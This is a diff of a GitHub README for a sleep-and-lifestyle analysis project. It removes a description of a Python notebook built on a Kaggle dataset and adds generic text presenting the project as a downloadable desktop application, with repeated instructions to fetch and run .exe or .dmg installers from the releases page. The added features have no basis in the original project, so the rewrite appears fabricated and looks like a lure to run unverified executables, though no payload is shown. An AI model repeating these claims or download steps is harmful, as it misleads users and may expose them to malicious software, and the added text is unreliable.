@@ -1,69 +1,68 @@
-# Lifestyle-Factors-Sleep-Analysis
-Analyzing how lifestyle factors affect sleep quality and duration using a real dataset
+# 🌙 Lifestyle-Factors-Sleep-Analysis - Understand Sleep through Lifestyle Insights
 
-## Project Overview
-This project explores how various lifestyle factors affect sleep quality and sleep duration. Using the Sleep Health and Lifestyle Dataset from Kaggle, we analyzed correlations and patterns in:
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/releases)
 
-- Sleep duration
-- Sleep quality
-- Stress level
-- Physical activity
-- BMI
-- Sleep disorders
+## 📖 About the Project
+Lifestyle-Factors-Sleep-Analysis helps you understand how different lifestyle choices affect your sleep quality and duration. This application uses real datasets to provide insights, making it easier for you to analyze your sleep patterns and improve your nightly rest.
 
-The goal is to understand how these factors influence sleep and identify patterns that could help improve sleep health.
+## 🚀 Getting Started
+To use this software, you need to follow a few simple steps to download and install it on your computer. 
 
----
+### 🖥️ System Requirements
+- **Operating System:** Windows 10, macOS, or Linux
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** Minimum of 200 MB available
+- **Internet Connection:** Required for downloading the application and datasets
 
-## Key Analyses
-1. **Sleep Duration vs Sleep Quality**  
-   Examined whether longer sleep is associated with better sleep quality.
+### 📥 Download & Install
+1. **Visit the Releases Page:** Go to [this page to download](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/releases).
+2. **Choose the Latest Version:** Look for the latest release at the top of the list. It usually has the highest version number.
+3. **Download the File:** Click on the link for the application file compatible with your operating system. Save it to a location you can easily find, like your desktop or downloads folder.
+4. **Run the Installer:**
+   - **Windows:** Double-click the `.exe` file. Follow the on-screen instructions.
+   - **macOS:** Open the `.dmg` file and drag the application to your Applications folder.
+   - **Linux:** Extract the downloaded files and follow the instructions in the README file inside the folder.
 
-2. **Stress Level vs Sleep Duration**  
-   Investigated how stress affects the number of hours a person sleeps.
+5. **Open the Application:** After installation, locate the application on your computer and double-click to open it.
 
-3. **Physical Activity vs Sleep Duration**  
-   Analyzed if higher physical activity levels are related to longer sleep.
+## 🎉 Features
+- **Data Analysis:** Automatically analyze how your lifestyle factors such as diet, exercise, and stress influence your sleep.
+- **Interactive Visuals:** View easy-to-read graphs and charts that display your sleep data over time.
+- **Export Reports:** Save your analysis reports in PDF format for easy sharing and review.
+- **User-Friendly Interface:** Enjoy a clean layout that is simple to navigate, even for beginners.
 
-4. **BMI Category vs Sleep Quality**  
-   Explored how body mass index affects sleep quality.
+## 📊 How It Works
+This application processes data from various sources to give you insights into your sleeping habits. By inputting your lifestyle factors, it generates personalized recommendations to enhance your sleep quality. It emphasizes the connection between what you do during the day and how well you sleep at night.
 
-5. **Sleep Disorder vs Sleep Duration**  
-   Checked if individuals with sleep disorders sleep fewer hours.
+### 🔍 Steps to Analyze Your Sleep
+1. **Input Your Data:** Enter your lifestyle factors like sleep times, daily activities, and stress levels.
+2. **View Insights:** Check the generated analysis to understand how different factors affect your sleep.
+3. **Implement Changes:** Use the recommendations to adjust your lifestyle for better sleep.
 
----
+## 💬 Support
+If you encounter any issues while downloading or using the application, please check the FAQ section in the documentation within the application. For further assistance, feel free to contact the support team through the issues page on GitHub.
 
-## Tools Used
-- Python (pandas, matplotlib, seaborn)
-- Google Colab
+## 📈 Future Improvements
+We are in the ongoing process of enhancing this application. Future updates will focus on:
+- Integrating more datasets for comprehensive analysis
+- Enhancing user experience based on feedback
+- Adding new features to improve analytics and reporting
 
----
+## 🛠️ Contributing
+We welcome contributions. If you wish to contribute, please follow these steps:
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your branch.
+5. Submit a pull request to the main repository.
 
-## Insights / Findings
-- Longer sleep correlates with better sleep quality.  
-- Higher stress levels are associated with shorter sleep duration.  
-- Individuals with higher physical activity tend to sleep slightly longer.  
-- Certain BMI categories are more likely to report poor sleep quality.  
-- Sleep disorders negatively affect sleep duration.  
-- Overall, lifestyle factors like stress, activity, BMI, and sleep disorders have a significant impact on sleep patterns.
+## 🔗 Find Us
+Stay updated on new features and versions by following us on GitHub. 
 
----
+### 🌐 Useful Links
+- [Releases Page](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/releases)
+- [Issues Page](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/issues)
+- [Documentation](https://github.com/Sungtae93/Lifestyle-Factors-Sleep-Analysis/wiki)
 
-## Dataset
-[Sleep Health and Lifestyle Dataset - Kaggle](https://www.kaggle.com/datasets/uom190346a/sleep-health-and-lifestyle-dataset)
-
----
-
-## How to Run
-1. Open the notebook (`.ipynb`) in Google Colab.  
-2. Upload the dataset CSV if prompted.  
-3. Run all cells to reproduce the analyses and visualizations.  
-
----
-
-## Optional Enhancements
-- Add more analyses, such as daily steps vs sleep quality.  
-- Visualize trends using interactive plots.  
-- Include recommendations for improving sleep based on findings.
-
-
+Thank you for your interest in Lifestyle-Factors-Sleep-Analysis! Enjoy discovering how lifestyle changes can promote better sleep.
